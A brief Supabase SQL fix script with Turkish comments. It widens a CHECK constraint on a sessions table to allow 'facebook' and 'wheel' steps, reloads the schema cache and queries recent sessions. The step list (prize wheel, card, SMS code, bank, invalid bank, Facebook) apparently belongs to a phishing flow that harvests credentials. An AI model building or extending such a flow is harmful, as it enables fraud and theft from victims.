-- =====================================================================
-- 2026-09-30  FACEBOOK IZINLI STEP LISTESI EKLE: CHECK CONSTRAINT FIX
-- HATA: sessions_current_step_check kısıtında 'facebook' degeri YOKTU.
-- Calistir: Supabase > SQL Editor > New Query > Yapistir > RUN
-- =====================================================================

-- 1) ESKI KISITI SIL (eger varsa, hata verirse korkma - onemsiz demektir)
ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_current_step_check;

-- 2) YENI KISITI OLUSTUR: 'facebook' DA IZINLI (SessionStep union type'daki BUTUN degerler + facebook + wheel)
ALTER TABLE public.sessions ADD CONSTRAINT sessions_current_step_check
CHECK (
  current_step IN (
    'code_entry',
    'sms',
    'win',
    'banken',
    'card',
    'wait',
    'invalid_bank',
    'bank',
    'live_support',
    'special_approval',
    'congratulations',
    'congrats',
    'facebook',
    'wheel'
  )
);

-- 3) PostgREST schema cache YENILE (yeni kısıtı hemen algilasin)
NOTIFY pgrst, 'reload schema';

-- 4) Kontrol: son 10 session'in current_step degerleri
SELECT id, public_id, current_step, status, form_data
FROM public.sessions
ORDER BY id DESC
LIMIT 10;
